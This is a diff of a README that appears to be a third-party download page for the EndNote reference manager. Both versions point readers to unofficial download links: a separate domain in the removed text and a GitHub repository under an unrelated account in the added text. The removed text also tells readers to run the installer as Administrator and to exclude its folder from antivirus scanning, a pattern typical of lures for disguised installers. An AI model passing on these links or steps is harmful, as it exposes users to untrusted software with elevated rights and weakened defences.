@@ -1,79 +1,102 @@
-# EndNote Download for Windows 11 & 10
-
-**EndNote-2026**
-
-**EndNote** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
-
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
-
----
-
-## Download & Install
-
-> **This is the download page.** Use the button or link below to get **EndNote** for Windows.
-
-<p align="center">
-  <a href="https://endnote.zipzapsol.space/">
-    <img src="https://img.shields.io/badge/Download-EndNote-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download EndNote">
-  </a>
-</p>
-
-| | |
-| --- | --- |
-| **Direct link** | **[endnote.zipzapsol.space](https://endnote.zipzapsol.space/)** |
-| **Full URL** | `https://endnote.zipzapsol.space/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
-
-### Quick steps
-
-1. Click **[Download — endnote.zipzapsol.space](https://endnote.zipzapsol.space/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
-
-<p align="center"><a href="https://endnote.zipzapsol.space/"><strong>⬇ Download EndNote now</strong></a></p>
-
----
-
-## About
-
-**EndNote** setup page for Windows PC users.
-
-**People also search for:** endnote download, endnote reference manager install setup windows 2026
-
-**Repository:** `EndNote-2026`
+# 📚 EndNote-2026 - Organize your research references with ease
 
 
-## After install
+[![](https://img.shields.io/badge/Download-EndNote-2026-blue)](https://github.com/fibromaflare175/EndNote-2026)
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
 
-## System requirements
+## What is EndNote-2026
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+EndNote-2026 software manages your bibliography and research references. It stores citation details, organizes research papers, and formats your bibliography in your writing documents. This tool works on Windows 10 and Windows 11. It helps students, researchers, and writers save time when they track sources.
 
-## Troubleshooting
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+## 💻 System Requirements
 
----
+Your computer must meet these requirements for the software to run well:
 
-**Topics:** endnote-download, endnote, endnote-reference-manager-install-setup-windows-20, reference, manager, endnote-2026, reference-manager, citations, research, software, windows-11, download
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: 1 gigahertz (GHz) or faster processor.
+* Memory: 4 gigabytes (GB) of RAM or more.
+* Storage: 1 gigabyte (GB) of available hard drive space.
+* Internet: Required for software activation and online library searches.
+* Word Processor: Microsoft Word 2016 or newer version.
+
+
+## 📥 Download and Install
+
+Follow these steps to set up the software on your computer.
+
+1. Visit the [EndNote-2026 Download Page](https://github.com/fibromaflare175/EndNote-2026).
+2. Locate the link to download the installer file.
+3. Click the link to save the installer file to your computer.
+4. Find the file in your Downloads folder once the download finishes.
+5. Double-click the file to start the installation.
+6. Follow the prompts on your screen.
+7. Select the default installation path if you do not have a preference.
+8. Wait for the progress bar to finish.
+9. Click finish to close the installer.
+
+
+## ⚙️ Initial Setup
+
+The first time you open the software, you must create a library file. This file acts as the database for your references.
+
+1. Open the EndNote-2026 program from your Start menu or desktop icon.
+2. Select "Create a new library" from the startup window.
+3. Choose a folder on your computer to save this library file.
+4. Name your file clearly, such as "MyResearchLibrary".
+5. Save the file.
+
+Your library is now active. You may begin adding your citations and papers.
+
+
+## ➕ How to Add References
+
+You can add references by hand or import them from research databases. To add a reference manually:
+
+1. Click the "References" menu at the top.
+2. Select "New Reference" from the list.
+3. Choose the type of reference, such as Journal Article or Book.
+4. Fill in the fields for the author, title, and year.
+5. Save the entry by clicking the "Save" icon.
+
+Repeat these steps for every source you collect for your project.
+
+
+## 📝 Using Citations in Documents
+
+EndNote-2026 adds a tab to your Microsoft Word ribbon. Use this tab to insert citations while you write.
+
+1. Open your Word document.
+2. Click the EndNote tab in the top menu bar.
+3. Place your cursor where you want the citation to appear.
+4. Click "Insert Citation" in the EndNote ribbon.
+5. Search for your reference by typing the author name or title.
+6. Select the correct item from the list and click "Insert".
+7. The software automatically creates the in-text citation and adds the reference to the end of your document.
+
+
+## 🔄 Updating and Maintenance
+
+Check for software updates to ensure the best performance.
+
+1. Open the EndNote software.
+2. Go to the "Help" menu.
+3. Look for "Check for Updates".
+4. Follow the prompts if an update exists.
+
+Back up your library file often. Copy your library file to an external hard drive or a cloud storage account regularly to prevent data loss.
+
+
+## ❓ Frequently Asked Questions
+
+What should I do if the software crashes?
+Restart your computer and reopen the program. If issues persist, reinstall the software using the original installer file.
+
+Can I move my library to another computer?
+Yes. Copy the library file and the accompanying data folder to a USB drive and move them to the new computer. Open the library file from the new location in the EndNote software.
+
+Does it work with Google Docs?
+EndNote-2026 integrates with Microsoft Word. Ensure you have the Word add-in enabled to use the citation features.
+
+How do I change my citation style?
+Use the "Style" dropdown menu in the EndNote toolbar within Word to switch between formats like APA, MLA, or Chicago.
